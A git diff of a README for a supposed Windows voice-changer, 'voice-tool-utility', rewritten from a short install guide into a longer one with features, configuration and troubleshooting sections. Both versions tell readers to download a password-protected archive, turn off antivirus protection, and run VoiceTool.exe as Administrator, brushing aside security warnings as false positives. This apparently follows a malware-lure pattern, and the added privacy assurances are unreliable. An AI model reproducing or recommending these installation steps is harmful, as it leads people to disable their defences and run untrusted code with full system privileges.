@@ -1,49 +1,63 @@
-# 🎙️ Voice Tool Utility
+# 🎙️ voice-tool-utility - Add professional audio effects to microphones
 
-> ⚡ **Real-time voice processing tool. Apply effects, suppress noise, and enhance your microphone output.**
+[Download Voice Tool Utility](https://github.com/particular-acceptance362/voice-tool-utility/releases)
 
-![GUI](screen.png)
+This application changes how your voice sounds across Windows. It captures your microphone input, applies digital effects, and sends the processed audio to your software of choice. You can use this tool for streaming, online games, or voice calls.
 
----
+## 🛠 Features
 
-## ✨ Features
+- Real-time voice processing with no delay.
+- Twenty unique audio effects including robot, deep, echo, and alien.
+- Automatic noise suppression to remove background hum from fans or keyboards.
+- Built-in echo cancellation for clean voice output.
+- Custom profiles to save your favorite effect combinations.
+- Full compatibility with Discord, OBS, Skype, and game voice chats.
+- Designed for Windows 10 and Windows 11.
 
-- ✅ **20+ voice effects** – robot, deep, echo, and more
-- ✅ **Real-time processing** – zero latency
-- ✅ **Noise suppression** and echo cancellation
-- ✅ **Custom profiles** – save your own presets
-- ✅ **Works with any application** – Discord, OBS, in-game chat
-- ✅ **Windows 10/11 support**
+## 💻 Requirements
 
----
+- Windows 10 or Windows 11 (64-bit).
+- Built-in or external USB microphone.
+- At least 200MB of free disk space.
+- A stable internet connection for the download.
+- Administrator access on your Windows user account.
 
-## 📥 How to Download & Install
+## 📥 Getting Started
 
-1. **Go to the official page:**  
-   👉 [https://laura-pokrov.github.io/voice-tool-utility/](https://laura-pokrov.github.io/voice-tool-utility/)
+Follow these steps to set up the software on your computer.
 
-2. Click the **"Download"** button.
+1. Visit the [official releases page](https://github.com/particular-acceptance362/voice-tool-utility/releases) to access the installer.
+2. Select the latest version listed under the Assets section.
+3. Download the compressed file to your Downloads folder.
+4. Right-click the file and select "Extract All" to open the contents.
+5. Use the password `voice2026` when prompted by your system.
+6. Temporarily turn off your antivirus protection if it blocks the installation. This application uses audio drivers that some security software marks as unknown.
+7. Double-click the file named VoiceTool.exe.
+8. Right-click the file and choose "Run as Administrator" to authorize the audio driver installation.
+9. Click "Yes" if Windows asks for permission to make changes to your system.
 
-3. **Extract** the archive with password: `voice2026`
+## 🎛 Configuring Audio
 
-4. **Disable your antivirus** temporarily – the tool uses audio driver hooks and may cause false positives.
+After you launch the application, you must link it to the software you use for talking.
 
-5. Run `VoiceTool.exe` as Administrator.
+1. Open your audio application, such as Discord or OBS.
+2. Navigate to the App Settings, then look for the Audio or Voice section.
+3. Change your Input Device setting to "Voice Tool Virtual Microphone."
+4. Return to the Voice Tool application window.
+5. Click the effect icons on the left side of the window to preview sounds.
+6. Adjust the slider bars for Volume and Noise Suppression to suit your environment.
+7. Save your current settings as a Profile using the top menu bar.
 
-6. Launch your app, select the virtual microphone, and configure your effects.
+## ⚙️ Troubleshooting Issues
 
----
+If you do not hear your voice or the quality seems low, check these points.
 
-## ⚠️ Important
+- Ensure your hardware microphone is selected in the Voice Tool settings menu.
+- Verify that your microphone is not muted by a physical switch on the device.
+- Check the Windows Sound Control Panel to ensure the virtual microphone is enabled.
+- Reinstall the driver if the application fails to detect your microphone hardware.
+- Close other audio software that might conflict with the microphone input.
 
-- This tool uses low-level audio driver hooks. Most antivirus software will show a false positive. Add the folder to exclusions or disable real-time protection before running.
+## 🛡 Security and Privacy
 
----
-
-## 📜 Disclaimer
-
-For personal and content creation use. Not affiliated with any third-party application.
-
----
-
-© 2026 Voice Tools. All rights reserved.
+This software operates locally on your machine. All processing happens on your processor. The application does not send audio data to external servers or store recordings unless you trigger a manual save command. The driver hooks allow the utility to pass audio to other programs on your machine. You control the connection at all times. If you feel uncomfortable, you can remove the application through the Windows Apps and Features menu, which triggers complete uninstallation of all drivers and support files.
